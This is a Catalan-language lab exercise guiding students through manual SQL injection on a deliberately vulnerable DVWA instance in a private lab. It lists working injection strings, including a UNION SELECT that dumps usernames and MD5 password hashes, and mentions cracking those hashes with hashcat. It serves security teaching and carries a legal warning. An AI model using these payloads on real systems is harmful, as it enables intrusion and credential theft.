---
id: EX-08-22
title: "SQL injection manual a DVWA nivell baix"
status: draft
version: 1.0
created: 2026-08-07
updated: 2026-08-07
authors:
  - Bernat Mora
  - Hermes Agent
tags:
  - sql-injection
  - dvwa
  - manual
  - nivell-mitja
prerequisites:
  - LAB-15-10
related:
  - LAB-15-10
  - LAB-15-11
estimated_time: 30 min
difficulty: beginner
---

# EX-08-22 - SQL injection manual a DVWA nivell baix

> Fer una SQL injection manual al DVWA, sense eines automatitzades.

## Que has de fer

1. Des del Kali, obre un navegador: `firefox http://10.10.30.10/`
2. Entra amb admin/password
3. Ves a DVWA Security i posa el nivell a Low
4. Ves a SQL Injection (al menu de l'esquerra)
5. Al camp User ID, posa: `1` (veuras un usuari)
6. Prova: `' OR '1'='1` (veuras TOTS els usuaris)
7. Prova: `' OR 1=1 -- ` (aixo es una altra variant)
8. Prova: `' UNION SELECT user, password FROM users -- `
9. Prova: `' UNION SELECT user, password FROM users#` (algunes vegades)
10. Anota les contrasenyes que vegis (estan en hash MD5)

## Que has de buscar

- Quants usuaris apareixen amb `' OR '1'='1`?
- Les contrasenyes son text pla o hash?
- Quin hash utilitza? (MD5, SHA1)
- Com podem protegir contra SQL injection?
- Per que el nivell Low es tan vulnerable?

## Preguntes per respondre

1. Quants usuaris has vist?
2. Les contrasenyes son hash? De quin tipus?
3. Com podem protegir contra SQL injection? (Prepared Statements)
4. Per que el nivell Low es vulnerable?

## Glossari

- **SQL injection**: Injeccio de codi SQL. Permet manipular la base de dades.
- **UNION SELECT**: Comanda SQL per combinar resultats de dues consultes.
- **MD5**: Algoritme de hash. Considerat feble avui dia.
- **Prepared Statements**: Tecnica per evitar SQL injection. Parametritzar les consultes.
- **hash**: Contrasenya xifrada. Pero MD5 es pot trencar amb eines com hashcat.

## Validacio

Quan acabis, compara els teus resultats amb els del document [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md).

## Seguretat

**Recorda**: 
- Aquestes tecniques nomes sha d'utilitzar en entorns controlats (com aquest lab)
- Mai en sistemes reals sense permis
- Practicar sense permis es IL·LEGAL

## Referencies

- [LAB-15-10](../labs/lab-15-10-lab-real-muntat.md) - Lab real muntat al Kali
- [LAB-15-11](../labs/lab-15-11-nmap-complet-metaploitable2.md) - Nmap complet
- [EX-08-01](ex-08-01-nmap-metasploitable.md) - Nmap Metasploitable
- [EX-08-02](ex-08-02-sql-injection-dvwa.md) - SQL Injection DVWA
